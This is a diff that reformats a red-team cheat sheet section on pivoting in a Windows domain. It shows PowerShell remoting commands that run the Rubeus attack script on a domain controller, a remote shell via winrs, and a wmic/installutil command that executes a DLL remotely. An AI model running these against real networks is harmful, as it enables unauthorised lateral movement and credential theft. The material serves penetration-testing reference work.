@@ -181,40 +181,45 @@ Find-InterestingDomainShareFile
 ## Pivoting
 ### Executing Commands Remotely
 #### PsExec
+
+
 #### Powershell Remote Session (PSRemote)
-    * "Usual" requirement is that you must be in the same subnet as the machine you are connecting to
-    * Create a session
-        * Without specified credentials
-            ```powershell
-            New-PSSession dc01.domain.com
-            $s = New-PSSession dc01.domain.com
-            ```
-        * Create a session with credentials
-            ```powershell
-            $cred = get-credential
-            New-PSSession dc01.domain.com –Credential $cred
-            ```
-    * Run commands remotely via PSSession
+
+* "Usual" requirement is that you must be in the same subnet as the machine you are connecting to
+* Create a session
+    * Without specified credentials
         ```powershell
-        Invoke-Command -Session $s -FilePath C:\Temp\Rubeus.ps1
+        New-PSSession dc01.domain.com
+        $s = New-PSSession dc01.domain.com
         ```
-    * Interactive PSSession
+    * Create a session with credentials
         ```powershell
-        Enter-PSSession -Id <#>
+        $cred = get-credential
+        New-PSSession dc01.domain.com –Credential $cred
         ```
-    * Exit PSSession
-        ```powershell
-        Remove-PSSession -Id <#>
-        ```
-#### Windows Remote Management
-    ```batch
-    winrs -r:DC01.domain.com cmd
+* Run commands remotely via PSSession
+    ```powershell
+    Invoke-Command -Session $s -FilePath C:\Temp\Rubeus.ps1
     ```
+* Interactive PSSession
+    ```powershell
+    Enter-PSSession -Id <#>
+    ```
+* Exit PSSession
+    ```powershell
+    Remove-PSSession -Id <#>
+    ```
+
+#### Windows Remote Management
+```batch
+winrs -r:DC01.domain.com cmd
+```
+
 #### WMIC
-    * Run a DLL file remotely using `wmic` via `installutil`[^13]
-        ```powershell
-        wmic /node:dc01.domain.com process call create "cmd.exe /c \windows\microsoft.net\framework64\v4.0.30319\installutil.exe /logfile= /u \temp\file.dll"
-        ```
+* Run a DLL file remotely using `wmic` via `installutil`[^13]
+    ```powershell
+    wmic /node:dc01.domain.com process call create "cmd.exe /c \windows\microsoft.net\framework64\v4.0.30319\installutil.exe /logfile= /u \temp\file.dll"
+    ```
 
 
 [^1]: [ired.team](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
